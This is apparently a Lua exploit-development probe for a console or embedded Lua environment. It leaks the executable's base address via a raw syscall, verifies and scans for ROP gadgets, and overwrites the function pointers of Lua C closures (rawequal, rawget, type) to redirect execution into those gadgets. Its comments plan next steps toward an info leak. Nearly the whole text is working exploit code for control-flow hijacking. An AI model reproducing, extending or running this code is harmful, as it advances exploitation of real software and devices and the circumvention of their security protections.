-- CRASH_CLASS: MODERATE
-- PROBE 56d2: CClosure gadget redirect — safe version
--
-- 56d confirmed: ret gadget EXECUTES but rax=undefined corrupts Lua state.
-- This version: start with xor eax,eax;ret (found at eboot+0x471) which
-- sets rax=0 (zero return values). Lua should handle this cleanly.
--
-- Test plan:
-- A. xor eax,eax;ret → verify clean return with 0 values
-- B. If A works, try gadgets that return controlled small values
-- C. Try mov [rdi],rax;ret to write through lua_State* (INFO LEAK?)
-- D. Multiple CClosure functions to verify generality

print("=== PROBE 56d2: CCLOSURE GADGET SAFE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

-- Gadgets
local G_ret          = 0x42
local G_xor_eax_ret  = 0x471   -- xor eax,eax; ret (31 C0 C3) — found by 56d scan
local G_pop_rdi      = 0xC9DFE -- pop rdi; ret

-- Verify xor eax,eax;ret bytes
local check = rd(text_lo + G_xor_eax_ret)
local b0 = check and (check % 256) or -1
local b1 = check and (math.floor(check / 256) % 256) or -1
local b2 = check and (math.floor(check / 65536) % 256) or -1
print(string.format("xor_eax_ret bytes: %02X %02X %02X (expect 31 C0 C3)", b0, b1, b2))
if b0 ~= 0x31 or b1 ~= 0xC0 or b2 ~= 0xC3 then
    print("ABORT: xor eax,eax;ret not at expected offset!")
    return
end

-- Get CClosure addresses
local function get_cclosure(fn, name)
    local s = tostring(fn)
    local addr_str = s:match("0x([0-9a-fA-F]+)") or s:match(": ([0-9a-fA-F]+)$") or s:match(": (%d+)$")
    if not addr_str then return nil end
    local addr = tonumber(addr_str, 16) or tonumber(addr_str)
    if not addr then return nil end
    local fn_ptr = rq(addr + 0x20)
    return {name = name, addr = addr, fn_ptr = fn_ptr, fn = fn}
end

local re = get_cclosure(rawequal, "rawequal")
local rg = get_cclosure(rawget, "rawget")
local ty = get_cclosure(type, "type")
local sel = get_cclosure(select, "select")

if not re then print("ABORT: can't find rawequal"); return end
print(string.format("rawequal: obj=0x%X fn=%s", re.addr, fmt(re.fn_ptr)))
if rg then print(string.format("rawget:   obj=0x%X fn=%s", rg.addr, fmt(rg.fn_ptr))) end
if ty then print(string.format("type:     obj=0x%X fn=%s", ty.addr, fmt(ty.fn_ptr))) end

-- ============ TEST A: xor eax,eax;ret on rawequal ============
print("")
print("[A] xor eax,eax;ret → rawequal (3 rounds)")

for round = 1, 3 do
    if not alive() then print("  R" .. round .. " DEAD"); break end

    local saved = rq(re.addr + 0x20)

    -- Write gadget
    pcall(function() memory.write_qword(re.addr + 0x20, eaddr(G_xor_eax_ret)) end)
    local wrote = rq(re.addr + 0x20)

    -- Call rawequal(1, 2) — should return nothing (0 return values)
    local ok, a, b = pcall(rawequal, 1, 2)

    -- Restore immediately
    pcall(function() memory.write_qword(re.addr + 0x20, saved) end)
    local rest = rq(re.addr + 0x20)

    print(string.format("  R%d: wrote=%s ok=%s a=%s b=%s restore=%s alive=%s",
        round, fmt(wrote), tostring(ok), tostring(a), tostring(b),
        tostring(fmt(rest) == fmt(saved)), tostring(alive())))
end

-- Verify rawequal still works normally
if alive() then
    local eq = rawequal(1, 1)
    local neq = rawequal(1, 2)
    print(string.format("  post: rawequal(1,1)=%s rawequal(1,2)=%s", tostring(eq), tostring(neq)))
end

-- ============ TEST B: xor eax,eax;ret on rawget ============
print("")
print("[B] xor eax,eax;ret → rawget (3 rounds)")

if rg and alive() then
    for round = 1, 3 do
        if not alive() then print("  R" .. round .. " DEAD"); break end

        local saved = rq(rg.addr + 0x20)
        pcall(function() memory.write_qword(rg.addr + 0x20, eaddr(G_xor_eax_ret)) end)

        local ok, a = pcall(rawget, {x=1}, "x")

        pcall(function() memory.write_qword(rg.addr + 0x20, saved) end)

        print(string.format("  R%d: ok=%s a=%s alive=%s",
            round, tostring(ok), tostring(a), tostring(alive())))
    end

    -- Verify
    if alive() then
        local v = rawget({key=42}, "key")
        print(string.format("  post: rawget={key=42}=%s", tostring(v)))
    end
end

-- ============ TEST C: xor eax,eax;ret on type ============
print("")
print("[C] xor eax,eax;ret → type (3 rounds)")

if ty and alive() then
    for round = 1, 3 do
        if not alive() then print("  R" .. round .. " DEAD"); break end

        local saved = rq(ty.addr + 0x20)
        pcall(function() memory.write_qword(ty.addr + 0x20, eaddr(G_xor_eax_ret)) end)

        local ok, a = pcall(type, 42)

        pcall(function() memory.write_qword(ty.addr + 0x20, saved) end)

        print(string.format("  R%d: ok=%s a=%s alive=%s",
            round, tostring(ok), tostring(a), tostring(alive())))
    end

    if alive() then
        print(string.format("  post: type(42)=%s type('x')=%s", type(42), type("x")))
    end
end

-- ============ TEST D: Scan for mov eax, 1; ret gadget ============
-- Bytes: B8 01 00 00 00 C3
print("")
print("[D] Scan for 'mov eax, 1; ret' (B8 01 00 00 00 C3)")

local mov_eax_1_off = nil
for off = 0, 0x100000 - 6, 1 do
    local d0 = rd(text_lo + off) or 0
    local d1 = rd(text_lo + off + 4) or 0
    local byte0 = d0 % 256
    local byte1 = math.floor(d0 / 256) % 256
    local byte2 = math.floor(d0 / 65536) % 256
    local byte3 = math.floor(d0 / 16777216) % 256
    local byte4 = d1 % 256
    local byte5 = math.floor(d1 / 256) % 256
    if byte0 == 0xB8 and byte1 == 0x01 and byte2 == 0x00 and byte3 == 0x00
       and byte4 == 0x00 and byte5 == 0xC3 then
        mov_eax_1_off = off
        print(string.format("  found at eboot+0x%X", off))
        break
    end
    if off % 0x10000 == 0 and off > 0 then
        native.fcall_with_rax(stub, 20)
    end
end

-- ============ TEST E: mov eax,1;ret → rawequal (returns 1 value) ============
if mov_eax_1_off and alive() then
    print("")
    print(string.format("[E] mov eax,1;ret (eboot+0x%X) → rawequal", mov_eax_1_off))
    print("  rax=1 → Lua expects 1 return value from the stack")

    for round = 1, 3 do
        if not alive() then print("  R" .. round .. " DEAD"); break end

        local saved = rq(re.addr + 0x20)
        pcall(function() memory.write_qword(re.addr + 0x20, eaddr(mov_eax_1_off)) end)

        -- Push known values before calling, so Lua pops them as "return values"
        local ok, a, b = pcall(rawequal, 1, 2)

        pcall(function() memory.write_qword(re.addr + 0x20, saved) end)

        print(string.format("  R%d: ok=%s a=%s b=%s alive=%s",
            round, tostring(ok), tostring(a), tostring(b), tostring(alive())))
    end
end

-- ============ TEST F: Stability check ============
print("")
print("[F] Final stability")
if alive() then
    local eq = rawequal(1, 1)
    local neq = rawequal(1, 2)
    local tp = type(42)
    local rg_v = rawget({a=1}, "a")
    print(string.format("  rawequal(1,1)=%s rawequal(1,2)=%s type(42)=%s rawget=%s",
        tostring(eq), tostring(neq), tp, tostring(rg_v)))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56d2 COMPLETE ===")
